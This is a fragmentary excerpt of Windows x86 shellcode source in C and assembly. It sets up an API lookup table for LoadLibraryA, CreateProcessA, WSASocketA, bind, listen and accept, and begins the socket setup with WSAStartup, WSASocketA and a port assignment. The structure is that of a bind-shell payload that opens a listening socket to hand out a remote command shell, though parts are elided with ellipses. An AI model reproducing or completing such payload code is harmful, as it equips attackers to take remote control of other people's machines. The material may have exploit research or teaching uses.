...
// ntdll.dll functions index
#define _RtlEnterCriticalSection 0x00
#define _RtlLeaveCriticalSection 0x04
// kernel32.dll functions index
#define _LoadLibraryA           0x08
#define _CreateProcessA         0x0C
#define _TerminateProcess       0x10
// ws2_32.dll functions index
#define _WSAStartup             0x14
#define _WSASocketA             0x18
#define _bind                   0x1C
#define _listen                 0x20
#define _accept                 0x24
// data
...
{
    // ntdll
    {"RtlEnterCriticalSection"},// [esi]
    {"RtlLeaveCriticalSection"},// [esi+0x04]
    // kernel32
    {"LoadLibraryA"},           // [esi+0x08]
    {"CreateProcessA"},         // [esi+0x0C]
    {"TerminateProcess"},       // [esi+0x10]
    // ws2_32
    {"WSAStartup"},             // [esi+0x14]
    {"WSASocketA"},             // [esi+0x18]
    {"bind"},                   // [esi+0x1C]
...
func_start:
        ...
        push    esp
        push    101h
        call    dword ptr [esi+_WSAStartup]
        ...
        push    1
        push    2
        call    dword ptr [esi+_WSASocketA]
        ...
        xchg    al, ah
        mov     word ptr [edi+2], ax            ; sockaddr_in.sin_port
